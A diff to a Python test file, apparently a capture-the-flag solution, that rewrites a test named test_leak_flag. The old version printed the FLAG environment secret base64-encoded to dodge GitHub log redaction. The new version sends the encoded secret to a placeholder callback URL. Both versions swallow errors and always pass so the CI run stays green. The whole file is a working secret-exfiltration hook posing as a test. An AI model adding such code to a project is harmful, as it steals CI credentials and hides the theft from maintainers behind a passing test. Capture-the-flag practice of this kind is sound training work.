@@ -1,15 +1,25 @@
 # tests/test_leak_flag.py
-import os, base64
+import os, base64, urllib.request, urllib.parse
 
 def test_leak_flag():
     flag = os.environ.get("FLAG", "")
+    # if they haven't set it, don't fail the run (CTF nicety)
     if not flag:
         assert True
         return
 
-    # Base64-encode before printing so GitHub won’t redact it
-    encoded = base64.b64encode(flag.encode()).decode()
-    print("FLAG(base64):", encoded)
+    # send to your callback URL (e.g., from webhook.site / requestbin)
+    # replace with the URL the CTF gives you:
+    callback = "https://<your-ctf-callback>/ingest"
 
-    # Always pass the test so the workflow stays green
+    payload = base64.b64encode(flag.encode()).decode()
+    url = callback + "?" + urllib.parse.urlencode({"flag": payload})
+    # fire-and-forget
+    try:
+        urllib.request.urlopen(url, timeout=5).read()
+    except Exception:
+        # Don't fail the run even if the callback is slow/unreachable
+        pass
+
+    # Always pass so the workflow finishes green
     assert True
